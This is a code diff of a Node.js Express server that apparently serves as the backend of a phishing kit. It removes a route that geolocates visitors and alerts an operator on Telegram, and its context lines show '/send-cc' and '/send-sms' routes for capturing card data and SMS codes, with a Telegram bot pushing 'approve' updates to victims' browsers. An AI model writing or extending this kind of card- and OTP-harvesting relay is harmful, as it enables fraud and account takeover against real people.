@@ -18,54 +18,7 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
 const sseConnections = {};
-app.get('/details', async (req, res) => {
-    const visitorIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const userAgent = req.headers['user-agent'];
-    const userId = req.headers['user-id'];
-    if (!userId) {
-        return res.status(400).json({ success: false, message: "User ID is required" });
-    }
 
-    const parsedUserAgent = userAgentParser(userAgent);
-    const browser = parsedUserAgent.browser.name;
-
-    let visitorCity = '';
-    let visitorCountry = '';
-    let visitorProvider = '';
-
-    try {
-        const ipInfoResponse = await axios.get(`http://ip-api.com/json/${visitorIp}`);
-        const ipInfo = ipInfoResponse.data;
-
-        if (ipInfo && ipInfo.status === 'success') {
-            visitorCity = ipInfo.city || 'Unknown';
-            visitorCountry = ipInfo.country || 'Unknown';
-            visitorProvider = ipInfo.org || 'Unknown';
-        }
-    } catch (error) {
-        console.error('Error fetching IP information:', error);
-    }
-
-    const message = `
-🚨 New Visitor Alert 🚨
-=====================
-🌍 IP Address: ${visitorIp}
-🏙 City: ${visitorCity}
-🏳️ Country: ${visitorCountry}
-🌐 Browser: ${browser}
-🛣 Provider: ${visitorProvider}
-🆔 User ID: ${userId}  
-=====================
-`;
-
-    try {
-        await sendToTelegram(message, userId);
-        res.json({ success: true });
-    } catch (error) {
-        console.error('Error notifying page load:', error);
-        res.status(500).json({ success: false });
-    }
-});
 app.get('/details-approve', async (req, res) => {
     const visitorIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const userAgent = req.headers['user-agent'];
@@ -114,6 +67,7 @@ app.get('/details-approve', async (req, res) => {
         res.status(500).json({ success: false });
     }
 });
+
 app.get('/user-id', (req, res) => {
     const userId = generateZariNumberId();
     console.log(`Generated user ID: ${userId}`);
@@ -198,7 +152,6 @@ app.post('/send-cc', async (req, res) => {
         res.status(500).send('Internal Server Error');
     }
 });
-
 
 app.post('/send-sms', async (req, res) => {
     const { codeSms, userId } = req.body;
@@ -297,10 +250,8 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     try {
-
         await bot.answerCallbackQuery(id, { text: responseText });
         console.log(`Answered callback query with text: ${responseText}`);
-
 
         if (sseConnections[userId]) {
             console.log(`Sending SSE update for user ${userId}`);
